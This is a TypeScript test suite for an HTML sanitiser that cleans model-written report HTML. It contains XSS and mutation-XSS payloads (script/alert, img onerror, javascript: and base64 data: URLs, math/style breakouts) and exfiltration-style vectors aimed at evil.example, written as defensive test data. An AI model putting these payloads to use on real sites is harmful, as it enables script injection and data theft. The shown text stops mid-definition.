/**
 * design/2026-08-20-agent-wolf.md § W17. This is the security boundary of
 * the report feature: model-authored HTML from a container reaches a human's
 * browser through `sanitiseSlot`, and a template a human locked reaches the
 * frame through `validateTemplate` unchanged.
 *
 * 🔴 **Read R120 before editing this file.** The pinned profile's worst
 * defect — `#text` missing from `ALLOWED_TAGS`, which sanitises every report
 * to an empty shell — was invisible to a vector table that only asserts
 * "the dangerous token is absent from the output", because the empty string
 * satisfies every such assertion. Every vector below is therefore run TWICE:
 * once bare, and once behind a prose marker that MUST survive. A vector
 * table with no positive case is green on a sanitiser that returns `""`.
 */

import { describe, expect, it } from "vitest";
import { readFileSync, readdirSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import DOMPurify from "isomorphic-dompurify";

import * as sanitiseModule from "./sanitise.js";
import { SLOT_PROFILE, sanitiseSlot, validateTemplate } from "./sanitise.js";
import { WolfError } from "../errors.js";
import { parseTemplate, structureHash } from "./template.js";

const here = dirname(fileURLToPath(import.meta.url));
const apiRoot = resolve(here, "../.."); // api/
const repoRoot = resolve(apiRoot, ".."); // agent-wolf/

/** The host every URL-bearing vector points at. It must never survive. */
const EVIL = "evil.example";
/** Prose that must come through every single vector. See the header. */
const KEEP = "KEEP-THIS-PROSE";
const MARKER = `<p>${KEEP}</p>`;

function lower(value: string): string {
  return value.toLowerCase();
}

/**
 * The `<table>` ancestor a table-internal tag needs before an HTML parser
 * will keep it at all. Identity for every other tag.
 */
function tableContextFor(tag: string): (fragment: string) => string {
  if (tag === "table") return (fragment) => fragment;
  if (["caption", "thead", "tbody", "tfoot", "colgroup"].includes(tag)) {
    return (fragment) => `<table>${fragment}</table>`;
  }
  if (tag === "tr") return (fragment) => `<table><tbody>${fragment}</tbody></table>`;
  if (["td", "th"].includes(tag)) {
    return (fragment) => `<table><tbody><tr>${fragment}</tr></tbody></table>`;
  }
  return (fragment) => fragment;
}

function expectAbsent(output: string, tokens: readonly string[]): void {
  const haystack = lower(output);
  for (const token of tokens) {
    expect(
      haystack.includes(lower(token)),
      `expected ${JSON.stringify(token)} to be absent from ${JSON.stringify(output)}`,
    ).toBe(false);
  }
}

/* ================================================================== */
/* 1. the pinned profile                                               */
/* ================================================================== */

describe("SLOT_PROFILE is the pinned allow list", () => {
  // Byte-for-byte from § "The slot sanitiser profile, pinned as an ALLOW
  // list". Widening either list is an OWNER decision; this test is what
  // makes a widening a deliberate, visible act rather than a diff nobody
  // reads.
  it("pins ALLOWED_TAGS exactly", () => {
    expect(SLOT_PROFILE.ALLOWED_TAGS).toEqual([
      "#text",
      "p", "br", "hr", "span", "div", "section",
      "strong", "em", "b", "i", "u", "s", "small", "mark",
      "code", "pre", "kbd", "samp", "var", "sub", "sup",
      "abbr", "dfn", "q", "blockquote", "cite", "time",
      "h1", "h2", "h3", "h4", "h5", "h6",
      "ul", "ol", "li", "dl", "dt", "dd",
      "table", "caption", "thead", "tbody", "tfoot", "tr", "th", "td",
    ]);
  });

  it("pins ALLOWED_ATTR exactly", () => {
    expect(SLOT_PROFILE.ALLOWED_ATTR).toEqual([
      "class", "title", "lang", "dir",
      "datetime", "colspan", "rowspan", "scope", "headers",
    ]);
  });

  // R120(1): DOMPurify treats an explicit ALLOWED_TAGS list as exhaustive
  // INCLUDING text nodes. Without this entry every report renders empty.
  it("keeps `#text` in ALLOWED_TAGS (R120(1): without it every report is empty)", () => {
    expect(SLOT_PROFILE.ALLOWED_TAGS).toContain("#text");
  });

  // R120(2): `false` turns `<article><p>analysis</p></article>` into the
  // empty string. FORBID_CONTENTS is what handles the dangerous case.
  it("keeps KEEP_CONTENT true and FORBID_CONTENTS as pinned (R120(2))", () => {
    expect(SLOT_PROFILE.KEEP_CONTENT).toBe(true);
    expect(SLOT_PROFILE.FORBID_CONTENTS).toEqual([
      "script", "style", "template", "noscript", "title", "textarea", "xmp",
    ]);
  });

  /**
   * 🔴 **A correction to R120(1), found by mutating this file's own
   * assertions.** Removing `#text` from `ALLOWED_TAGS` reddens the two
   * literal-pinning tests above and **nothing else** — every prose test
   * stays green. That is not a weakness in those tests: `dompurify` does
   * `if (KEEP_CONTENT) { ALLOWED_TAGS['#text'] = true; }` while reading the
   * config, so with `KEEP_CONTENT: true` the entry is REDUNDANT.
   *
   * R120's two corrections therefore defend the SAME failure, and only
   * breaking both at once produces it. The hazard that leaves behind is
   * real: an editor who mutation-tests `#text`, finds it inert and deletes
   * it removes the belt while leaving only the braces — and a later revisit
   * of `KEEP_CONTENT` (which looks safer as `false`) then re-opens R120(1)'s
   * blocking defect with no test in the suite to catch it.
   *
   * This test is the catch. It calls DOMPurify directly — the only place in
   * the module or its tests that does other than `sanitiseSlot` — because
   * the claim is about the LIBRARY's behaviour under variants of the pinned
   * profile, which `sanitiseSlot` deliberately cannot express.
   */
  it("R120 CORRECTION: `#text` is redundant while KEEP_CONTENT is true, and load-bearing the moment it is not", () => {
    const prose = `<p class="lead">Gold <strong>rose</strong> 4%.</p>`;
    const variant = (withText: boolean, keepContent: boolean): Record<string, unknown> => ({
      ...SLOT_PROFILE,
      ALLOWED_TAGS: SLOT_PROFILE.ALLOWED_TAGS.filter((tag) => withText || tag !== "#text"),
      KEEP_CONTENT: keepContent,
    });
    const sanitise = (config: Record<string, unknown>): string =>
      DOMPurify.sanitize(prose, config as never) as unknown as string;

    // The pinned profile, and each single-entry mutation of it: prose lives.
    expect(sanitise(variant(true, true))).toBe(prose);
    expect(sanitise(variant(false, true))).toBe(prose);
    expect(sanitise(variant(true, false))).toBe(prose);

    // Both broken at once: R120(1)'s exact failure — every element standing,
    // every character of prose gone.
    expect(sanitise(variant(false, false))).toBe(`<p class="lead"><strong></strong></p>`);
  });

  it("pins the remaining switches", () => {
    expect(SLOT_PROFILE.ALLOW_DATA_ATTR).toBe(false);
    expect(SLOT_PROFILE.ALLOW_ARIA_ATTR).toBe(false);
    expect(SLOT_PROFILE.ALLOW_UNKNOWN_PROTOCOLS).toBe(false);
    expect(SLOT_PROFILE.USE_PROFILES).toBe(false);
    expect(SLOT_PROFILE.WHOLE_DOCUMENT).toBe(false);
    expect(SLOT_PROFILE.RETURN_DOM).toBe(false);
    expect(SLOT_PROFILE.RETURN_DOM_FRAGMENT).toBe(false);
    expect(SLOT_PROFILE.RETURN_TRUSTED_TYPE).toBe(false);
    expect(SLOT_PROFILE.SANITIZE_DOM).toBe(true);
  });

  // The point of the list is what is NOT on it: no URL-bearing attribute,
  // no element that can carry one, no foreign content.
  it.each(["img", "a", "svg", "math", "iframe", "script", "style", "form", "input"])(
    "does not allow <%s>",
    (tag) => {
      expect(SLOT_PROFILE.ALLOWED_TAGS as readonly string[]).not.toContain(tag);
    },
  );

  it.each(["src", "href", "style", "id", "srcset", "action", "formaction", "background", "ping"])(
    "does not allow the `%s` attribute",
    (attr) => {
      expect(SLOT_PROFILE.ALLOWED_ATTR as readonly string[]).not.toContain(attr);
    },
  );
});

/* ================================================================== */
/* 2. prose survives — the R120(1) guard                               */
/* ================================================================== */

describe("prose survives sanitisation", () => {
  // The exact example R120 records. If `#text` ever leaves ALLOWED_TAGS,
  // this is the first thing that goes red.
  it("keeps text, inline markup and an allowed attribute", () => {
    const input = `<p class="lead">Gold <strong>rose</strong> 4%.</p>`;
    expect(sanitiseSlot(input).html).toBe(input);
  });

  // R120(2): with KEEP_CONTENT false this is the empty string — one wrapper
  // element the model reached for, and the whole day's analysis is gone.
  it("drops a disallowed wrapper but keeps its children (KEEP_CONTENT)", () => {
    expect(sanitiseSlot(`<article><p>some analysis</p></article>`).html).toBe(
      `<p>some analysis</p>`,
    );
  });

  it("keeps prose on both sides of a stripped script", () => {
    expect(sanitiseSlot(`<p>before</p><script>alert(1)</script><p>after</p>`).html).toBe(
      `<p>before</p><p>after</p>`,
    );
  });

  it("keeps the text of a stripped link, and not its URL", () => {
    const out = sanitiseSlot(`<a href="https://${EVIL}/x">link text</a>`).html;
    expect(out).toBe("link text");
  });

  it("keeps bare text with no markup at all", () => {
    expect(sanitiseSlot("just words, no markup").html).toBe("just words, no markup");
  });

  // Every allowed tag, one row each: text inside it comes through. This is
  // the broad form of the R120(1) guard — removing `#text` reddens all of
  // them at once, and so does any accidental narrowing of the tag list.
  //
  // ⚠️ The table-internal tags need their `<table>` ancestor, because an
  // HTML parser DISCARDS a bare `<tr>`/`<td>`/`<thead>` in body context —
  // see "slot content is parsed in BODY context" below, which pins that as
  // a real property of the sanitiser rather than hiding it here.
  it.each(
    SLOT_PROFILE.ALLOWED_TAGS.filter(
      (tag) => tag !== "#text" && tag !== "br" && tag !== "hr",
    ).map((tag) => [tag, tableContextFor(tag)] as const),
  )("carries text through <%s>", (tag, wrap) => {
    const out = sanitiseSlot(wrap(`<${tag}>${KEEP}</${tag}>`)).html;
    expect(out).toContain(KEEP);
    expect(out).toContain(`<${tag}`);
  });

  // 🔴 HAND-OFF TO W19 AND W25. `sanitiseSlot` parses slot content on its
  // own, in BODY context — it cannot know that the slot element it will be
  // inserted into is a `<tbody>` or a `<tr>`. So a model that fills a
  // table-internal slot with `<tr><td>…</td></tr>` loses the tags to the
  // PARSER (not to the allow list) and keeps only the text, silently, and
  // `strippedCount` reports 0 because the sanitiser never saw them.
  //
  // The answer is an authoring rule — a slot is a container the tick fills
  // with prose-level markup, and table structure belongs in the template —
  // not a change here. Pinned so it is a known property rather than a
  // surprise found in a browser.
  it("parses slot content in BODY context: bare table-row markup keeps its text, not its tags", () => {
    const result = sanitiseSlot(`<tr><td>${KEEP}</td></tr>`);
    expect(result.html).toBe(KEEP);
    expect(result.strippedCount).toBe(0);
    // With its own <table> ancestor inside the same slot, it survives whole.
    expect(sanitiseSlot(`<table><tr><td>${KEEP}</td></tr></table>`).html).toContain("<td>");
  });

  it.each([
    [`<p class="lead">t</p>`, "class"],
    [`<abbr title="Gross Domestic Product">GDP</abbr>`, "title"],
    [`<p lang="en">t</p>`, "lang"],
    [`<p dir="rtl">t</p>`, "dir"],
    [`<time datetime="2026-08-26">today</time>`, "datetime"],
    [`<table><tr><td colspan="2">t</td></tr></table>`, "colspan"],
    [`<table><tr><td rowspan="2">t</td></tr></table>`, "rowspan"],
    [`<table><tr><th scope="col">t</th></tr></table>`, "scope"],
    [`<table><tr><td headers="h1">t</td></tr></table>`, "headers"],
  ])("keeps the allowed attribute in %s", (input, attr) => {
    expect(sanitiseSlot(input).html).toContain(attr);
  });

  it("keeps a whole report-shaped table intact", () => {
    const input =
      `<table class="scoreboard"><caption>Metrics</caption>` +
      `<thead><tr><th scope="col" colspan="2">Metric</th></tr></thead>` +
      `<tbody><tr><td headers="metric">Gold</td><td><time datetime="2026-08-26">today</time></td></tr></tbody>` +
      `<tfoot><tr><td>end</td></tr></tfoot></table>`;
    const result = sanitiseSlot(input);
    expect(result.html).toBe(input);
    expect(result.strippedCount).toBe(0);
  });
});

/* ================================================================== */
/* 3. no URL survives a slot                                           */
/* ================================================================== */

describe("no URL survives a slot", () => {
  // The criterion the whole trust model rests on: a remote `src` in a slot
  // would be a daily, human-unreviewed egress channel inside a frame whose
  // entire design is that nothing untrusted reaches the network.
  it.each([
    ["img", `<img src="https://${EVIL}/pixel.png?d=secret">`, ["img", "src", EVIL, "secret"]],
    ["a", `<a href="https://${EVIL}/?d=secret">click</a>`, ["<a", "href", EVIL, "secret"]],
    ["src", `<video src="https://${EVIL}/v.mp4"></video>`, ["src", EVIL]],
    ["href", `<link href="https://${EVIL}/x.css" rel="stylesheet">`, ["href", EVIL]],
    ["style", `<p style="background:url(https://${EVIL}/x)">t</p>`, ["style", EVIL]],
  ])("strips every URL channel: %s", (_name, input, forbidden) => {
    expectAbsent(sanitiseSlot(input).html, forbidden);
    expectAbsent(sanitiseSlot(MARKER + input).html, forbidden);
  });

  // A URL-bearing attribute sitting on an element that IS allowed. This is
  // the case that catches `src` (or `href`, or `style`) being added to
  // ALLOWED_ATTR — the tag-level cases above would not, because <img> is
  // removed for being <img> whatever the attribute list says.
  it.each([
    "src", "href", "style", "srcset", "poster", "background", "ping",
    "action", "formaction", "data", "xlink:href", "longdesc", "cite", "profile", "usemap",
  ])("strips the `%s` attribute from an ALLOWED element", (attr) => {
    const input = `<span ${attr}="https://${EVIL}/x">${KEEP}</span>`;
    const result = sanitiseSlot(input);
    expectAbsent(result.html, [attr, EVIL]);
    // ...and the prose still comes through, so this is not green on "".
    expect(result.html).toContain(KEEP);
  });

  it("strips a protocol-relative and a relative URL too", () => {
    expectAbsent(sanitiseSlot(`<img src="//${EVIL}/x">`).html, [EVIL, "src"]);
    expectAbsent(sanitiseSlot(`<a href="/internal/secret">t</a>`).html, ["href", "secret"]);
  });
});

/* ================================================================== */
/* 4. the vector table                                                 */
/* ================================================================== */

/**
 * Every HTML event-handler content attribute in the HTML Living Standard's
 * two lists (global handlers, plus the window-reflecting and element-only
 * ones), so "every `on*` attribute" is exercised as written rather than
 * sampled. The three synthetic rows at the end prove the rule is an `on*`
 * PREFIX rule and not an allow list of known names.
 */
const EVENT_HANDLER_ATTRS = [
  "onabort", "onauxclick", "onbeforeinput", "onbeforematch", "onbeforetoggle",
  "onblur", "oncancel", "oncanplay", "oncanplaythrough", "onchange", "onclick",
  "onclose", "oncontextlost", "oncontextmenu", "oncontextrestored", "oncopy",
  "oncuechange", "oncut", "ondblclick", "ondrag", "ondragend", "ondragenter",
  "ondragleave", "ondragover", "ondragstart", "ondrop", "ondurationchange",
  "onemptied", "onended", "onerror", "onfocus", "onformdata", "oninput",
  "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onload", "onloadeddata",
  "onloadedmetadata", "onloadstart", "onmousedown", "onmouseenter",
  "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup",
  "onpaste", "onpause", "onplay", "onplaying", "onprogress", "onratechange",
  "onreset", "onresize", "onscroll", "onscrollend", "onsecuritypolicyviolation",
  "onseeked", "onseeking", "onselect", "onslotchange", "onstalled", "onsubmit",
  "onsuspend", "ontimeupdate", "ontoggle", "onvolumechange", "onwaiting",
  "onwheel", "onanimationcancel", "onanimationend", "onanimationiteration",
  "onanimationstart", "ontransitioncancel", "ontransitionend", "ontransitionrun",
  "ontransitionstart", "onpointerdown", "onpointerup", "onpointermove",
  "onpointerover", "onpointerout", "onpointerenter", "onpointerleave",
  "onpointercancel", "ongotpointercapture", "onlostpointercapture",
  "onafterprint", "onbeforeprint", "onbeforeunload", "onhashchange",
  "onlanguagechange", "onmessage", "onmessageerror", "onoffline", "ononline",
  "onpagehide", "onpageshow", "onpopstate", "onrejectionhandled", "onstorage",
  "onunhandledrejection", "onunload", "onbegin", "onrepeat", "onend",
  // Synthetic: an attribute nobody has heard of, a mixed-case one, and a
  // future one. If any of these survives, the defence is a name list.
  "onnotarealevent", "oNcLiCk", "onfutureevent2030",
] as const;

/**
 * One row per vector. `forbidden` names the tokens that must be ABSENT FROM
 * THE OUTPUT STRING — "different from the input" is satisfied by `""`, which
 * is exactly the trap R120(1) sprang.
 *
 * `headOnlyElement` marks the rows whose element an HTML parser would hoist
 * into `<head>` if the content were parsed in document context. Before the
 * profile carried `FORCE_BODY: true` those rows never reached the sanitiser
 * at all and `strippedCount` reported 0 for them (W17's F2, ruled and closed
 * 2026-08-26, R147). They are still marked, because they are exactly the
 * rows that regress if `FORCE_BODY` is ever removed.
 */
interface Vector {
  name: string;
  input: string;
  forbidden: string[];
  headOnlyElement?: true;
}

const VECTORS: Vector[] = [
  {
    name: "<script>",
    input: `<script>alert(1)</script>`,
    forbidden: ["<script", "alert(1)"],
    headOnlyElement: true,
  },
  {
    name: "<script> with prose either side",
    input: `<p>before</p><script>alert(1)</script><p>after</p>`,
    forbidden: ["<script", "alert(1)"],
  },
  {
    name: "<script src>",
    input: `<div><script src="https://${EVIL}/x.js"></script></div>`,
    forbidden: ["<script", "src", EVIL],
  },
  {
    name: "<iframe>",
    input: `<iframe src="https://${EVIL}/x"></iframe>`,
    forbidden: ["<iframe", "src", EVIL],
  },
  {
    name: "<object>",
    input: `<object data="https://${EVIL}/x.swf"><param name="movie" value="https://${EVIL}/x"></object>`,
    forbidden: ["<object", "<param", "data=", EVIL],
  },
  {
    name: "<embed>",
    input: `<embed src="https://${EVIL}/x">`,
    forbidden: ["<embed", "src", EVIL],
  },
  {
    name: "<link>",
    input: `<link rel="stylesheet" href="https://${EVIL}/x.css">`,
    forbidden: ["<link", "href", EVIL],
    headOnlyElement: true,
  },
  {
    name: "<style>",
    input: `<style>body{background:url(https://${EVIL}/x)}</style>`,
    forbidden: ["<style", EVIL, "background"],
    headOnlyElement: true,
  },
  {
    // ⚠️ Nothing here may end with the CSS @import keyword sitting directly
    // against a closing quote: api/'s import-boundary checker parses that as
    // a module specifier and reports a nonsense violation (R145(2), still
    // open — this ticket is the fourth to hit it). Hence the longer token
    // below, which is a stronger assertion anyway.
    name: "<style> in body, with an @import rule",
    input: `<div><style>@import url("https://${EVIL}/x.css");</style></div>`,
    forbidden: ["<style", "@import url(", EVIL],
  },
  {
    name: "<form>",
    input: `<form action="https://${EVIL}/collect"><input name="secret"><button>go</button></form>`,
    forbidden: ["<form", "<input", "action", EVIL],
  },
  {
    name: "<base>",
    input: `<base href="https://${EVIL}/">`,
    forbidden: ["<base", "href", EVIL],
    headOnlyElement: true,
  },
  {
    name: "<meta http-equiv=refresh>",
    input: `<meta http-equiv="refresh" content="0;url=https://${EVIL}/x">`,
    forbidden: ["<meta", "http-equiv", EVIL],
    headOnlyElement: true,
  },
  {
    name: "srcdoc",
    input: `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`,
    forbidden: ["srcdoc", "<iframe", "alert(1)", "script"],
  },
  {
    name: "javascript: URL",
    input: `<a href="javascript:alert(1)">click</a>`,
    forbidden: ["javascript:", "alert(1)", "href"],
  },
  {
    name: "javascript: URL, obfuscated with entities and whitespace",
    input: `<a href="ja&#118;ascri&#x70;t:\talert(1)">click</a>`,
    forbidden: ["javascript:", "alert(1)", "href"],
  },
  {
    name: "data: URL on a link",
    input: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`,
    forbidden: ["data:", "base64", "href"],
  },
  {
    name: "data: URL on an image",
    input: `<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">`,
    forbidden: ["data:", "base64", "<img", "src"],
  },
  {
    name: "<svg> with an inline handler",
    input: `<svg><circle onload="alert(1)" r="1"/></svg>`,
    forbidden: ["<svg", "<circle", "onload", "alert(1)"],
  },
  {
    name: "<math> foreign content",
    input: `<math><mtext>x</mtext></math>`,
    forbidden: ["<math", "<mtext"],
  },
  {
    name: "<noscript>",
    input: `<div><noscript><p>hidden</p></noscript></div>`,
    forbidden: ["<noscript", "hidden"],
  },
  {
    name: "<template>",
    input: `<div><template><p>tpl</p></template></div>`,
    forbidden: ["<template", "tpl"],
  },
  {
    name: "<textarea>",
    input: `<div><textarea>&lt;img src=x onerror=alert(1)&gt;</textarea></div>`,
    forbidden: ["<textarea", "onerror", "alert(1)"],
  },
  {
    name: "<xmp>",
    input: `<div><xmp><img src=x onerror=alert(1)></xmp></div>`,
    forbidden: ["<xmp", "onerror", "alert(1)"],
  },
  {
    name: "<title>",
    input: `<title>a title</title>`,
    forbidden: ["<title", "a title"],
    headOnlyElement: true,
  },
  {
    name: "id attribute (decoy for the template's getElementById)",
    input: `<p id="chart">${KEEP}</p>`,
    forbidden: ["id="],
  },
  {
    name: "data-* attribute (a phantom slot region)",
    input: `<p data-wolf-slot="phantom">${KEEP}</p>`,
    forbidden: ["data-wolf-slot", "phantom"],
  },
  {
    name: "data-wolf-fallback attribute",
    input: `<p data-wolf-fallback>${KEEP}</p>`,
    forbidden: ["data-wolf-fallback"],
  },
  {
    name: "aria-* attribute",
    input: `<p aria-label="spoken differently">${KEEP}</p>`,
    forbidden: ["aria-label", "spoken differently"],
  },
  {
    name: "unknown protocol",
    input: `<a href="tel:+15550001111">call</a>`,
    forbidden: ["tel:", "href"],
  },
  {
    name: "<marquee> and other junk elements",
    input: `<marquee><blink>${KEEP}</blink></marquee>`,
    forbidden: ["<marquee", "<blink"],
  },
];

describe("the vector table", () => {
  it.each(VECTORS.map((vector) => [vector.name, vector] as const))(
    "strips %s",
    (_name, vector) => {
      const bare = sanitiseSlot(vector.input);
      expectAbsent(bare.html, vector.forbidden);

      // Run again behind a prose marker. TWO things this catches that the
      // bare run cannot: (a) the output is not vacuously empty — the marker
      // proves real content survives the same call that strips the vector;
      // (b) the leading <p> forces the parser into body mode, so elements
      // the parser would otherwise hoist into <head> reach the sanitiser
      // and are counted.
      const wrapped = sanitiseSlot(MARKER + vector.input);
      expectAbsent(wrapped.html, vector.forbidden);
      expect(wrapped.html).toContain(KEEP);
      expect(wrapped.strippedCount).toBeGreaterThan(0);
    },
  );

  it.each(VECTORS.map((vector) => [vector.name, vector] as const))(
    "is idempotent for %s (sanitising twice equals sanitising once)",
    (_name, vector) => {
      for (const input of [vector.input, MARKER + vector.input]) {
        const once = sanitiseSlot(input).html;
        const twice = sanitiseSlot(once);
        expect(twice.html).toBe(once);
        // Nothing left to remove on the second pass either — a non-zero
        // count here would mean the first pass emitted something its own
        // profile rejects.
        expect(twice.strippedCount).toBe(0);
      }
    },
  );

  it("never leaves a URL to the hostile host in ANY vector's output", () => {
    for (const vector of VECTORS) {
      expectAbsent(sanitiseSlot(vector.input).html, [EVIL]);
      expectAbsent(sanitiseSlot(MARKER + vector.input).html, [EVIL]);
    }
  });

  it("never leaves anything that looks like an event handler in ANY vector's output", () => {
    const handlerish = /\son[a-z0-9-]+\s*=/i;
    for (const vector of VECTORS) {
      expect(handlerish.test(sanitiseSlot(vector.input).html)).toBe(false);
      expect(handlerish.test(sanitiseSlot(MARKER + vector.input).html)).toBe(false);
    }
  });

  it.each(EVENT_HANDLER_ATTRS)("strips the `%s` handler attribute", (handler) => {
    const input = `<p ${handler}="alert(1)">${KEEP}</p>`;
    const result = sanitiseSlot(input);
    expectAbsent(result.html, [handler, "alert(1)"]);
    expect(result.html).toContain(KEEP);
    expect(result.strippedCount).toBe(1);
  });

  it("strips a handler from an element that is itself removed", () => {
    expectAbsent(sanitiseSlot(`<img src=x onerror=alert(1)>`).html, ["onerror", "alert(1)", "img"]);
  });

  // 🔴 THE FORCE_BODY CRITERION (R147). Each of these elements is one an
  // HTML parser hoists into <head> in document context. Before
  // `FORCE_BODY: true` each was discarded by the PARSER, never reached the
  // sanitiser, and reported `strippedCount: 0` — so the single worst slot in
  // the product, `<script>alert(1)</script>` alone, rendered as an empty
  // region with NO degraded-severity notice, because W23 gates that notice
  // on `stripped_count > 0`. This is the test that fails if `FORCE_BODY` is
  // ever removed from the profile.
  it.each(
    VECTORS.filter((vector) => vector.headOnlyElement === true).map((v) => [v.name, v] as const),
  )("counts %s even when it is the FIRST thing in a slot (FORCE_BODY)", (_name, vector) => {
    const bare = sanitiseSlot(vector.input);
    expect(bare.html).toBe("");
    // The element and everything the sanitiser stripped from it.
    expect(bare.strippedCount).toBeGreaterThan(0);
    // ...and the count no longer depends on whether prose happens to precede
    // it, which is what "the parser decided, not the sanitiser" looked like.
    expect(sanitiseSlot(MARKER + vector.input).strippedCount).toBe(bare.strippedCount);
  });

  // The seven head-only elements the ruling names, each as the FIRST thing in
  // a slot, asserted by name rather than only through the vector table.
  it.each([
    ["script", `<script>alert(1)</script>`],
    ["style", `<style>p{color:red}</style>`],
    ["link", `<link rel="stylesheet" href="https://${EVIL}/x.css">`],
    ["meta", `<meta http-equiv="refresh" content="0;url=https://${EVIL}/">`],
    ["base", `<base href="https://${EVIL}/">`],
    ["title", `<title>t</title>`],
    ["template", `<template><p>x</p></template>`],
  ])(
    "counts a leading <%s>, which the parser used to swallow before the sanitiser saw it",
    (_name, input) => {
      const result = sanitiseSlot(input);
      expect(result.html).toBe("");
      expect(result.strippedCount).toBeGreaterThan(0);
    },
  );
});

/* ================================================================== */
/* 5. mutation-XSS regressions                                         */
/* ================================================================== */

/** The three regressions the ticket names, plus two of the same family. */
const MXSS_CASES: Array<[string, string]> = [
  ["noscript/title breakout", `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`],
  ["svg/style breakout", `<svg><style><img src=x onerror=alert(1)></style></svg>`],
  [
    "math/mglyph/style breakout",
    `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">`,
  ],
  ["math wrapper around prose", `<math><mtext>${KEEP}</mtext></math>`],
  [
    "form/isindex style breakout",
    `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>`,
  ],
];

describe("mutation-XSS regressions", () => {
  // The three named in the ticket. Each is a case where a naive sanitiser's
  // OUTPUT reparses into something dangerous — which is also why the
  // idempotence checks above matter: a sanitiser whose output is not a fixed
  // point is reading its own output differently from how it read the input.
  // 🔴 The ONE output the FORCE_BODY ruling changed, pinned so the change is
  // recorded rather than absorbed. Before: `<p></p>` — an empty paragraph
  // survived, because in document context the `<noscript>` was hoisted into
  // `<head>` and its `<p>` fell into `<body>` on its own, ROUTING AROUND
  // `FORBID_CONTENTS`. After: `""` — the sanitiser now sees the `<noscript>`
  // it was always meant to suppress. Strictly tighter; no dangerous token was
  // present in either.
  it("FORCE_BODY changed exactly one output: the noscript breakout now suppresses whole", () => {
    expect(sanitiseSlot(`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`).html).toBe(
      "",
    );
  });

  it.each(MXSS_CASES)("neutralises %s", (_name, input) => {
    const once = sanitiseSlot(input);
    expectAbsent(once.html, ["onerror", "alert(1)", "<img", "<svg", "<math", "<style", "<noscript"]);
    // Idempotent: reparsing the output yields the same bytes, so the browser
    // that renders it sees what this sanitiser saw.
    const twice = sanitiseSlot(once.html);
    expect(twice.html).toBe(once.html);
    expect(twice.strippedCount).toBe(0);
  });
});

/* ================================================================== */
/* 6. strippedCount                                                    */
/* ================================================================== */

describe("strippedCount", () => {
  // ⚠️ The wrapper-root correction. DOMPurify records its own walk root —
  // the parser's <body>, which is not on ALLOWED_TAGS — in `removed`, so a
  // naive `removed.length` is 1 for clean input and every healthy report in
  // the product would carry a "content was removed" warning.
  it.each([
    ["clean prose", `<p class="lead">Gold <strong>rose</strong> 4%.</p>`],
    ["a clean table", `<table><tr><td colspan="2">1</td></tr></table>`],
    ["bare text", `plain words`],
    ["the empty string", ``],
    ["whitespace only", `   `],
  ])("is zero for %s", (_name, input) => {
    expect(sanitiseSlot(input).strippedCount).toBe(0);
  });

  it("counts one removed node", () => {
    expect(sanitiseSlot(`<div><script>alert(1)</script></div>`).strippedCount).toBe(1);
  });

  it("counts one removed attribute", () => {
    expect(sanitiseSlot(`<p onclick="alert(1)">t</p>`).strippedCount).toBe(1);
  });

  // 🔴 The criterion is "nodes AND attributes". A count of nodes alone reads
  // 1 here; a count of attributes alone reads 2.
  it("counts nodes AND attributes together", () => {
    // <img> (1 node) + onerror + src (2 attributes) = 3.
    expect(sanitiseSlot(`<img src="x" onerror="alert(1)">`).strippedCount).toBe(3);
  });

  it("counts every removal in a mixed slot", () => {
    // <article> hoisted (1) + <script> (1) + onclick (1) + id (1) = 4.
    const input =
      `<article><p id="decoy" onclick="alert(1)">${KEEP}</p><script>alert(2)</script></article>`;
    const result = sanitiseSlot(input);
    expect(result.strippedCount).toBe(4);
    expect(result.html).toContain(KEEP);
  });

  it("grows with the amount removed", () => {
    const one = sanitiseSlot(`<p onclick="x">t</p>`).strippedCount;
    const three = sanitiseSlot(`<p onclick="x" onload="y" id="z">t</p>`).strippedCount;
    expect(one).toBe(1);
    expect(three).toBe(3);
  });

  it("does not count a model-authored <body> tag as the wrapper root twice", () => {
    // The parser merges a nested <body> start tag into the existing body, so
    // there is no second element to remove — and the prose still survives.
    // `class` is on the allow list, so it merges and is not removed either.
    const result = sanitiseSlot(`<p>a</p><body class="x"><p>b</p></body>`);
    expect(result.html).toBe(`<p>a</p><p>b</p>`);
    expect(result.strippedCount).toBe(0);
  });

  // F8, re-measured after FORCE_BODY: a handler on a model-authored <body>
  // merges onto the wrapper element, and the neutralisation pass strips it
  // off the removed subtree — so it IS counted, and it is gone.
  it("counts a handler on a model-authored <body>", () => {
    const result = sanitiseSlot(`<p>a</p><body onload="alert(1)"><p>b</p></body>`);
    expect(result.html).toBe(`<p>a</p><p>b</p>`);
    expect(result.strippedCount).toBe(1);
  });

  // The FORCE_BODY sentinel is literally a `<remove>` element DOMPurify
  // prefixes to the input. A model that writes one of its own must still be
  // counted — the artefact skip looks only at the head of the record list,
  // in a fixed order, so the model's copy sits past it.
  it("counts a model-authored <remove> element, which is the sentinel's own tag name", () => {
    const result = sanitiseSlot(`<remove>${KEEP}</remove>`);
    expect(result.html).toBe(KEEP);
    expect(result.strippedCount).toBe(1);
    const second = sanitiseSlot(`<p>a</p><remove>x</remove>`);
    expect(second.html).toBe(`<p>a</p>x`);
    expect(second.strippedCount).toBe(1);
  });

  // DOMPurify substitutes `<!-->` for an EMPTY input, so its placeholder
  // comment must not be counted — while a comment the MODEL wrote must be.
  it("counts a model-authored comment but not DOMPurify's empty-input placeholder", () => {
    expect(sanitiseSlot("").strippedCount).toBe(0);
    const result = sanitiseSlot(`<p>a</p><!-- a note to nobody -->`);
    expect(result.html).toBe(`<p>a</p>`);
    expect(result.strippedCount).toBe(1);
  });
});

/* ================================================================== */
/* 7. the asymmetry — the entire locking design                        */
/* ================================================================== */

const MAX_BYTES = 200_000;

/** A template that would pass a human review: chart code inline, a fallback. */
const SCRIPT_TEXT = `<script>document.title = "chart"; alert(1)</script>`;
const TEMPLATE =
  `<section class="report">` +
  `<div data-wolf-slot="headline"></div>` +
